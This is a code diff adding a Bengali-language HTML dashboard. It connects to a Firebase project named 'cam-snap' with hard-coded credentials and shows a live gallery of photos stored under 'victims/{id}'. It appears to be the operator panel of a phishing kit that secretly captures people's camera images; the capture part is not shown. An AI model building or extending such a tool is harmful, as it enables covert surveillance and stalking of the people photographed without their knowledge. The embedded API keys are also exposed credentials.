@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard • লাইভ ছবি</title>
+  <style>
+    body { font-family: 'Poppins', sans-serif; background:#f9f9f9; margin:0; padding:20px; }
+    h1 { text-align:center; color:#000; font-size:2.5em; margin:30px 0; }
+    .grid { 
+      display: grid; 
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+      gap: 20px; 
+      max-width: 1200px; 
+      margin: 0 auto; 
+    }
+    img { width:100%; border-radius:15px; border:4px solid #ff0050; box-shadow:0 10px 30px rgba(0,0,0,0.2); }
+    .loading { text-align:center; font-size:1.8em; color:#555; margin-top:100px; }
+  </style>
+</head>
+<body>
+
+<h1>লাইভ ছবি দেখুন</h1>
+<div class="loading" id="loading">ছবি আসছে... অপেক্ষা করুন</div>
+<div class="grid" id="gallery"></div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
+  authDomain: "cam-snap-8e956.firebaseapp.com",
+  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
+  projectId: "cam-snap-8e956",
+  storageBucket: "cam-snap-8e956.firebasestorage.app",
+  messagingSenderId: "982089892260",
+  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
+  measurementId: "G-S5S37F55T6"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const urlParams = new URLSearchParams(location.search);
+const id = urlParams.get('id');
+
+if (!id) {
+  document.body.innerHTML = "<h1 style='text-align:center;color:red;margin-top:100px'>ভুল লিংক!</h1>";
+  throw new Error();
+}
+
+db.ref(`victims/${id}`).on('value', snap => {
+  const gallery = document.getElementById('gallery');
+  const loading = document.getElementById('loading');
+  gallery.innerHTML = '';
+
+  if (snap.val()) {
+    loading.style.display = 'none';
+    const photos = Object.values(snap.val()).sort((a,b) => b.time - a.time);
+    photos.forEach(p => {
+      const img = document.createElement('img');
+      img.src = p.url;
+      img.onclick = () => window.open(p.url, '_blank');
+      gallery.appendChild(img);
+    });
+  }
+});
+</script>
+</body>
+</html>
